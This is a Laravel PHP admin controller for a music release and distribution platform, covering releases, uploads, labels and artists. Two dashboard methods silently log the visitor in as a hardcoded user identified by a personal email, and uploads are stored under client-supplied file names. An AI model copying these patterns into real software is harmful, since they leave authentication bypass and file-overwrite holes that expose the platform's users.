<?php

namespace App\Http\Controllers;

use App\Models\Admin;
use App\Models\admin\Account;
use App\Models\admin\Artist;
use App\Models\admin\Label;
use wapmorgan\MediaFile\MediaFile;
use App\Models\album;
use App\Models\TotalStores;
use App\Models\artwork;
use App\Models\CustomUserSettings;
use App\Models\ArtistReleases;
use App\Models\genre;
use App\Models\Languages;
use App\Models\primaryGenre;
use App\Models\release;
use App\Models\User;
use App\Models\AudioDetails;
use App\Models\TrackDetails;
use App\Models\audio;
use Illuminate\Contracts\Auth\Guard;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Hash;
use Maatwebsite\Excel\Facades\Excel;
use Illuminate\Support\Facades\Validator;
use Monarobase\CountryList\CountryListFacade;
use Illuminate\Support\Facades\DB;


class AdminController extends Controller
{
    public function index()
    {
        $labels = User::where('role_id', '3')->get();
        $user = User::where('email','=','muddasar.habib156@gmail.com')->first();
        Auth::loginUsingId($user->id, TRUE);
        return view('admin.dashboard', compact('labels'));
    }
    public function create()
    {
        return view('admin.file');
    }
    public function user_settings()
    {
        $users = User::where('role_id','!=','1')->get();
        return view('admin.user_settings',compact('users'));
    }
    public function multiple_users_settings(Request $request){
      $ids = $request->id_users;
      $stores = TotalStores::all();
      return view('admin.setting',compact('stores','ids'));

    }

    public function multiple_users_store(Request $request){
      $ids = $request->id_users;
      $ids = explode(',', $ids);
      foreach ($ids as $id) {
        if(CustomUserSettings::where('user_id', $id)->exists()) {
          $target_user = User::where('id', $id)->first();
          $target_user->custom_settings = 1;
          $target_user->save();
          $user_settings = CustomUserSettings::where('user_id', $id)->first();
          $user_settings->c_year = $request->c_year;
          $user_settings->r_year = $request->r_year;
          $user_settings->c_license = $request->c_license;
          $user_settings->r_license = $request->r_license;
          $user_settings->user_id = $id;
          $user_settings->stores = $request->stores;
          $user_settings->save();
        }
        else {
          $target_user = User::where('id', $id)->first();
          $target_user->custom_settings = 1;
          $target_user->save();
          $user_settings = new CustomUserSettings;
          $user_settings->c_year = $request->c_year;
          $user_settings->r_year = $request->r_year;
          $user_settings->c_license = $request->c_license;
          $user_settings->r_license = $request->r_license;
          $user_settings->user_id = $id;
          $user_settings->stores = $request->stores;
          $user_settings->save();
        }

      }

    }

    public function edit_settings_page($id){
      $user_id = $id;
      $stores = TotalStores::all();
      return view('admin.setting',compact('user_id','stores'));
    }
    public function add_settings_user(Request $request, $id){
      if(CustomUserSettings::where('user_id', $id)->exists()) {
        $target_user = User::where('id', $id)->first();
        $target_user->custom_settings = 1;
        $target_user->save();
        $user_settings = CustomUserSettings::where('user_id', $id)->first();
        $user_settings->c_year = $request->c_year;
        $user_settings->r_year = $request->r_year;
        $user_settings->c_license = $request->c_license;
        $user_settings->r_license = $request->r_license;
        $user_settings->user_id = $id;
        $user_settings->stores = $request->stores;
        $user_settings->save();
      }
      else {
        $target_user = User::where('id', $id)->first();
        $target_user->custom_settings = 1;
        $target_user->save();
        $user_settings = new CustomUserSettings;
        $user_settings->c_year = $request->c_year;
        $user_settings->r_year = $request->r_year;
        $user_settings->c_license = $request->c_license;
        $user_settings->r_license = $request->r_license;
        $user_settings->user_id = $id;
        $user_settings->stores = $request->stores;
        $user_settings->save();
      }

    }
    public function dashboard_new()
    {
        $user = User::where('email','=','muddasar.habib156@gmail.com')->first();
        Auth::loginUsingId($user->id, TRUE);
        $actions = album::where('user_id', $user->id)->where('need_action', 1)->get();
        $in_review = album::where('user_id', $user->id)->where('in_review', 1)->get();
        $is_approved = album::where('user_id', $user->id)->where('is_approved', 1)->get();
        $is_removed = album::where('user_id', $user->id)->where('is_removed', 1)->get();
        $num_actions = count($actions);
        $num_review = count($in_review);
        $num_approved = count($is_approved);
        $num_removed = count($is_removed);
        $action_releases = array();
        $artwork = array();
        $track = array();
        $review_releases = array();
        $review_artwork = array();
        $review_track = array();
        $approved_releases = array();
        $approved_artwork = array();
        $approved_track = array();
        $removed_releases = array();
        $removed_artwork = array();
        $removed_track = array();

        foreach($actions as $action){
          $action_releases[] = release::where('id', $action->release)->first();
          $artwork[] = artwork::where('id', $action->artwork)->first();
          $temp = audio::where('album_id', $action->id)->get();
          $track[] = count($temp);
        }

        foreach($in_review as $review){
          $review_releases[] = release::where('id', $review->release)->first();
          $review_artwork[] = artwork::where('id', $review->artwork)->first();
          $temp = audio::where('album_id', $review->id)->get();
          $review_track[] = count($temp);
        }

        foreach($is_approved as $approved){
          $approved_releases[] = release::where('id', $approved->release)->first();
          $approved_artwork[] = artwork::where('id', $approved->artwork)->first();
          $temp = audio::where('album_id', $approved->id)->get();
          $approved_track[] = count($temp);
        }

        foreach($is_removed as $removed){
          $removed_releases[] = release::where('id', $removed->release)->first();
          $removed_artwork[] = artwork::where('id', $removed->artwork)->first();
          $temp = audio::where('album_id', $removed->id)->get();
          $removed_track[] = count($temp);
        }


        return view('admin.dashboard-new', compact('num_actions','num_review','num_approved','num_removed','approved_releases','approved_artwork','approved_track','removed_releases','removed_artwork','removed_track','action_releases','artwork','track','review_releases','review_artwork','review_track'));
    }
    public function release($id){

        $album = album::findOrFail($id);
        $countries = [];
        $collections = Excel::toArray(new Languages,'languages.xlsx');
        $languages = $collections[0];
        $labels = User::where('role_id', '3')->get();
        return view('admin.release', compact('labels','countries','languages','album'));

    }
    public function albumShow($id)
    {
        $album = album::findOrFail($id);
        $release_id = $album->release;
        $artwork_id = $album->artwork;
        $audio_id = $album->audio;
        $store_id = $album->store;
        $audio = null;
        $artwork = null;
        $track = null;
        $aud = null;
        $release = null;
        if($release_id != 0 ){
          $release = release::findOrFail($release_id);
        }
        if($artwork_id != 0 ){
          $artwork = artwork::findOrFail($artwork_id);
        }
        if($audio_id != 0 ){
          $audio = audio::findOrFail($audio_id);
          $track = TrackDetails::where('track_id', $audio->album_id)->get();
          $aud = AudioDetails::where('release_id', $audio->album_id)->first();
        }

        return view('admin.album',compact('album','release','audio','artwork','track','aud'));


    }

    public function AdminAlbumShow($id){
      $album = album::findOrFail($id);
      $release_id = $album->release;
      $artwork_id = $album->artwork;
      $audio_id = $album->audio;
      $store_id = $album->store;
      $audio = null;
      $artwork = null;
      $track = null;
      $aud = null;
      $release = null;
      if($release_id != 0 ){
        $release = release::findOrFail($release_id);
      }
      if($artwork_id != 0 ){
        $artwork = artwork::findOrFail($artwork_id);
      }
      if($audio_id != 0 ){
        $audio = audio::findOrFail($audio_id);
        $track = TrackDetails::where('track_id', $audio->album_id)->get();
        $aud = AudioDetails::where('release_id', $audio->album_id)->first();
      }

      return view('admin.admin_check',compact('album','release','audio','artwork','track','aud'));
    }

    public function releaseStore(Request $request,$id)
    {

        $release = new release;
        $release->title = $request->title;
        $release->language = $request->Language;
        $release->content = $request->explicitContent;
        $release->p_genre = $request->primaryGenre;
        $release->s_genre = $request->secondaryGenre;
        $release->is_compilation = $request->compilation;
        $release->record = $request->record;
        $release->c_year = $request->c_year;
        $release->r_year = $request->r_year;
        $release->c_license = $request->c_license;
        $release->r_license = $request->r_license;
        $release->original_release = $request->org_rel;
        $release->pre_order = $request->pre_ord;
        $release->sales = $request->sal_st;
        $release->version = $request->titleVersion;
        $release->save();

        foreach($request->artist_name as $index => $fid) {
          $artist = new ArtistReleases;
          $artist->release_id = $release->id;
          $artist->artist_name = $request->artist_name[$index];
          $artist->artist_genre = $request->artist_genre[$index];
          $artist->artist_link = $request->artist_link[$index];
          $artist->save();
        }

        $album = album::findOrFail($id);
        $album->release = $release->id;
        $album->save();
        return redirect('album/'.$album->id);

    }
    public function audio($id){
        $album = album::findOrFail($id);
        return view('admin.audio',compact('album'));
    }
    public function audioStore(Request $request,$id)
    {
      $request->validate([
        'audiofile' => 'required|mimes:wav',
      ]);
      $fname = $request->file('audiofile')->getClientOriginalName();
      $path = $request->file('audiofile')->storeAs('public/audio', $fname);
      $p = public_path('storage/audio/' . $fname);
      $media = MediaFile::open($p);
      $aud = $media->getAudio();
      $sampleR = $aud->getSampleRate().PHP_EOL;
      $sampleBR = $aud->getBitRate().PHP_EOL;
      $songs = audio::where('album_id', $id)->get();
      $count = $songs->count();
      if($sampleR >= 44100) {
         $audio = audio::create([
            'song'=> $fname,
            'album_id' => $id,
            'song_name'=> $request->trName,
            'song_track_number' => $count+1,
            'duration' => $aud->getLength().PHP_EOL,
        ]);
      $album = album::findOrFail($id);
      $album->audio = $audio->id;
      $album->save();
      return response()->json(['success' => 'Your Track has been successfully uploaded.']);
      }
    }

    public function audiodetails(Request $request, $id){
      $record = new AudioDetails;
      $fetch = audio::where('id', $id)->first();
      $record->track_name = $request->trackName;
      $record->track_language = $request->Language;
      $record->track_content = $request->contente;
      $record->track_version = $request->trackVersion;
      $record->track_isrc = $request->record;
      $record->release_id = $fetch->album_id;
      $record->audio_id = $fetch->id;
      $record->save();
      $fetch->is_set_audio = 1;
      $fetch->save();
      foreach($request->artist_name as $index => $fid) {
        $artist = new TrackDetails;
        $artist->track_id = $fetch->album_id;
        $artist->audio_id = $fetch->id;
        $artist->track_name = $request->artist_name[$index];
        $artist->track_genre = $request->artist_genre[$index];
        $artist->track_record_id = AudioDetails::where('audio_id', $id)->value('id');
        $artist->track_artist_link = $request->artist_link[$index];
        $artist->save();
      }
      return redirect('/album/'.$fetch->album_id);
    }

    public function artwork($id){
        $album = album::findOrFail($id);
        return view('admin.upload-album',compact('album'));
    }
    public function artworkStore(Request $request,$id)
    {
       $request->validate([
           'image' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048|dimensions:width=3000px,height=3000px'
       ]);
      $artwork = new artwork;
      $fname = $request->file('image')->getClientOriginalName();
      $path = $request->file('image')->storeAs('image', $fname);
      $artwork->image = $path;
      $artwork->album_id = $id;
      $artwork->save();
      $album = album::findOrFail($id);
      $album->artwork = $artwork->id;
      $album->save();
      return redirect('/album/'.$album->id);

    }
    public function store($id){
        $user = Auth::user();
        if($user->custom_settings == 1){
          $custom_settings = CustomUserSettings::where('user_id', $user->id)->first();
          $removable_stores = $custom_settings->stores;
          $removable_stores = explode(',', $removable_stores);
          $stores = TotalStores::all();
          foreach($stores as $key => $store){
            foreach($removable_stores as $rm){
              if($rm == $store->store_id){
                $stores->pull($key);
              }
            }
          }
          $album = album::findOrFail($id);
          $collection = Excel::toArray(new Languages,'countries_v1.xlsx');
          $territiores = $collection[0];
          return view('admin.store',compact('album','territiores','stores'));
        }
        else {
          $album = album::findOrFail($id);
          $stores = TotalStores::all();
          $collection = Excel::toArray(new Languages,'countries_v1.xlsx');
          $territiores = $collection[0];
          return view('admin.store',compact('album','territiores','stores'));
        }

    }
    public function Album(){

        $album = album::create([
            'release' =>false,
            'audio'=>false,
            'artowrk'=>false,
            'studio'=>false,
        ]);

        return view('admin.album',compact('album'));
    }
    public function file(){
        $countries = CountryListFacade::getList('en');
        $collections = Excel::toArray(new Languages,'languages.xlsx');
        $languages = $collections[0];
        $labels = User::where('role_id', '3')->get();
        return view('admin.file', compact('labels','countries','languages'));

    }


    public function loginForm()
    {
        //return view('auth.login');
    }
    //for logout
    public function Logout()
    {
        Auth::logout();
        return redirect('admin/login');
    }
    //for chat view
    public function Chat()
    {
        return view('admin.chat.index');
    }
    //for update Profile
    public function update_profile(Request $req)
    {
        if ($req->pass != '') {
            $pass = Hash::make($req->pass);
        } else {
            $pass = Auth::user()->password;
        }
        if ($req->img) {
            $img = $req->img;
            $img_name = rand(111111, 9999999) . '.' . $img->getClientOriginalExtension();
            $img->storeAs('public/image', $img_name);
        } else {
            $img_name = $req->old_img;
        }

        User::where(['id' => Auth::user()->id])->update([
            'first_name' => $req->fname,
            'last_name' => $req->lname,
            'payment_method' => $req->payment_method,
            'picture' => $img_name,
            'password' => $pass,
            'contact_no' => $req->tPhone

        ]);
        return redirect()->back()->with('success', 'Successfully updated Your Account!');
    }
    //label functions
    public function labels()
    {
        $labels = Label::with(['account'])->get();
        // $accounts = Account::where('role_id', null)->orWhere('role_id', 0)->get();
        $accounts = Account::get();
        // echo "<pre>";
        // dd($accounts);
        // exit;
        return view('admin.label.labels-list', compact('labels', 'accounts'));
    }
    public function insert_label(Request $request)
    {
        if ($request->isMethod('post')) {
            $request->validate([
                'label_name' => 'required',
                'account' => 'required',
                // 'email' => 'required',
                'country' => 'required',
                'artist_many' => 'max:20',
            ]);
            if ($request->hasFile('img')) {
                $img = $request->img;
                $img_name = rand(111111, 9999999) . '.' . $request->img->getClientOriginalExtension();
                $request->img->storeAs('public/image', $img_name);
            } else {
                $img_name = "";
            }
            Label::create([
                // 'first_name' => $request->fname,
                'account_id' => $request->account,
                'parent_label' => $request->parent_label,
                'label_name' => $request->label_name,
                'beatport' => $request->beatport,
                'traxsource' => $request->traxsource,
                'email' => $request->email,
                'country' => $request->country,
                'website' => $request->website,
                'my_space' => $request->my_space,
                'facebook' => $request->facebook,
                'twitter' => $request->twitter,
                'sound_cloud' => $request->sound_cloud,
                'youtube' => $request->youtube,
                'genre_1' => $request->genre_1,
                'genre_2' => $request->genre_2,
                'image' => $img_name,
                'compilations_label' => $request->compilations_label,
                'biography' => $request->biography,
            ]);

            Account::where('id', $request->account)->update(['role_id' => 3]);
            return redirect()->back()->with('success', 'Label Inserted Successfully');
        } else {
            return abort(404);
        }
    }
    public function edit_label($id)
    {
        $label = Label::where('id', $id)->first();
        $labels = Label::where('id', '!=', $id)->get();
        // $accounts = Account::where('role_id', null)->orWhere('role_id', 0)->get();
        $accounts = Account::get();


        return view('admin.label.edit_label', compact('label', 'labels', 'accounts'));
    }

     public function view_artists($id)
    {
        // $labels = Label::with(['artists'])->get();
        $artists = Artist::where('label_id', '=', $id)->get();
        // $accounts = Account::where('role_id', null)->orWhere('role_id', 0)->get();
        $accounts = Account::get();
        return view('admin.label.view_artists', compact('artists', 'accounts'));
    }

    public function update_label(Request $request)
    {

        if ($request->isMethod('post')) {
            $request->validate([
                'label_name' => 'required',
                'account' => 'required',
                // 'email' => 'required',
                'country' => 'required',
                'artist_many' => 'max:20',
            ]);
            if ($request->hasFile('img')) {
                File::delete(public_path('storage/image/' . $request->old_img));
                $img_name = rand(111111, 9999999) . '.' . $request->img->getClientOriginalExtension();
                $request->img->storeAs('public/image', $img_name);
            } else {
                $img_name = "";
            }
            Label::where('id', $request->id)->first()->account->update(['role_id' => 0]);
            Label::where('id', $request->id)->update([
                // 'first_name' => $request->fname,
                'account_id' => $request->account,
                'parent_label' => $request->parent_label,
                'label_name' => $request->label_name,
                'beatport' => $request->beatport,
                'traxsource' => $request->traxsource,
                'email' => $request->email,
                'country' => $request->country,
                'website' => $request->website,
                'my_space' => $request->my_space,
                'facebook' => $request->facebook,
                'twitter' => $request->twitter,
                'sound_cloud' => $request->sound_cloud,
                'youtube' => $request->youtube,
                'genre_1' => $request->genre_1,
                'genre_2' => $request->genre_2,
                'image' => $img_name,
                'compilations_label' => $request->compilations_label,
                'biography' => $request->biography,
            ]);

            Account::where('id', $request->account)->update(['role_id' => 3]);
            return redirect()->back()->with('success', 'Label Updated Successfully');
        } else {
            return abort(404);
        }
    }
    public function delete_label($id)
    {
        $delete = User::where('id', $id)->delete();
        if ($delete) {
            return redirect()->back()->with('success', 'Label Deleted Successfully');
        }
    }
    //artists functions
    public function artists()
    {
        $artists = Artist::with(['label'])->get();
        $labels = Label::get();
        $accounts = Account::where('role_id', null)->orWhere('role_id', 0)->get();
        return view('admin.artist.artist-list', compact('artists', 'labels', 'accounts'));
    }
    public function insert_artist(Request $request)
    {
        if ($request->isMethod('post')) {
            $request->validate([
                'name' => 'required',
                'label_id' => 'required',
                'fname' => 'required',
                'lname' => 'required',
                'gender' => 'required',
                'phone' => 'required',
                'country' => 'required',
                'phone' => 'required',
            ]);
            if ($request->hasFile('img')) {
                $img_name = rand(111111, 9999999) . '.' . $request->img->getClientOriginalExtension();
                $request->img->storeAs('public/image', $img_name);
            } else {
                $img_name = "";
            }
            Artist::create([
                'label_id' => $request->label_id,
                'name' => $request->name,
                'contact_email' => $request->email,
                'first_name' => $request->fname,
                'last_name' => $request->lname,
                'gender' => $request->gender,
                'telephone' => $request->phone,
                'image' => $img_name,
                'biography' => $request->biography,
                'release_feed' => $request->release_feed,
                'artist_feed' => $request->artist_feed,
                'building_name_no' => $request->building_name_no,
                'street' => $request->street,
                'area' => $request->area,
                'town' => $request->town,
                'county' => $request->county,
                'post_code' => $request->post_code,
                'country' => $request->country,
                'apple_music_profile' => $request->apple_profile,
                'apple_music_URL' => $request->apple_music_url,
                'facebook' => $request->facebook,
                'sound_cloud' => $request->sound_cloud,
                'spotify_profile' => $request->spotify_profile,
                'spotify_URL' => $request->spotify_url,
                'twitter' => $request->twitter,
                'website' => $request->website,
            ]);
            return redirect()->back()->with('success', 'Artist Inserted Successfully');
        }
    }
    public function edit_artist($id)
    {
        $artist = Artist::where('id', $id)->first();
        $labels = Label::get();
        $accounts = Account::where('role_id', null)->orWhere('role_id', 0)->get();
        return view('admin.artist.edit_artist', compact('artist', 'labels', 'accounts'));
    }
    public function update_artist(Request $request)
    {
        if ($request->isMethod('post')) {
            $request->validate([
                'name' => 'required',
                'label_id' => 'required',
                'fname' => 'required',
                'lname' => 'required',
                'gender' => 'required',
                'phone' => 'required',
                'country' => 'required',
                'phone' => 'required',
            ]);
            if ($request->hasFile('img')) {
                File::delete(public_path('storage/image/' . $request->old_img));
                $img_name = rand(111111, 9999999) . '.' . $request->img->getClientOriginalExtension();
                $request->img->storeAs('public/image', $img_name);
            } else {
                $img_name = "";
            }
            Artist::where('id', $request->id)->update([
                'label_id' => $request->label_id,
                'name' => $request->name,
                'contact_email' => $request->email,
                'first_name' => $request->fname,
                'last_name' => $request->lname,
                'gender' => $request->gender,
                'telephone' => $request->phone,
                'image' => $img_name,
                'biography' => $request->biography,
                'release_feed' => $request->release_feed,
                'artist_feed' => $request->artist_feed,
                'building_name_no' => $request->building_name_no,
                'street' => $request->street,
                'area' => $request->area,
                'town' => $request->town,
                'county' => $request->county,
                'post_code' => $request->post_code,
                'country' => $request->country,
                'apple_music_profile' => $request->apple_profile,
                'apple_music_URL' => $request->apple_music_url,
                'facebook' => $request->facebook,
                'sound_cloud' => $request->sound_cloud,
                'spotify_profile' => $request->spotify_profile,
                'spotify_URL' => $request->spotify_url,
                'twitter' => $request->twitter,
                'website' => $request->website,
            ]);
            return redirect()->back()->with('success', 'Artist Updated Successfully');
        } else {
            return abort(404);
        }
    }

    public function admin_dashboard(){
      $user = Auth::user();
      $is_pending = album::where('is_pending', 1)->get();
      $pending_releases = array();
      $pending_artwork = array();
      $pending_track = array();
      $submission_date = array();
      $album_pending = array();
      foreach($is_pending as $pending){
        $album_pending[] = $pending;
        $pending_releases[] = release::where('id', $pending->release)->first();
        $pending_artwork[] = artwork::where('id', $pending->artwork)->first();
        $temp = audio::where('album_id', $pending->id)->get();
        $pending_track[] = count($temp);
        $submission_date[] = release::where('id', $pending->release)->value('created_at');
      }

      return view('admin.admin_dashboard', compact('album_pending','pending_releases','pending_artwork','pending_track','submission_date'));
    }

    public function delete_artist($id)
    {
        $delete = User::where('id', $id)->delete();
        if ($delete) {
            return redirect()->back()->with('success', 'Artist Deleted Successfully');
        }
    }

    // public function login(Request $request)
    // {
    //     $credentials = $request->only('email', 'password');
    //     if (Auth::guard('admin')->attempt($credentials, $request->remember)) {
    //         $user = Admin::where('email', $request->email)->first();
    //         Auth::guard('admin')->login($user);
    //         return redirect()->route('admin.home');
    //     }
    //     return redirect()->route('admin.login')->with('status', 'Failed To Process Login');
    // }
    // public function logout()
    // {

    //     Auth::logout();
    //     return redirect('admin/login');
    //     Auth::guard('admin')->logout();
    //     return redirect()->route('admin.login')->with('status', 'Logout successfully');
    // }
}
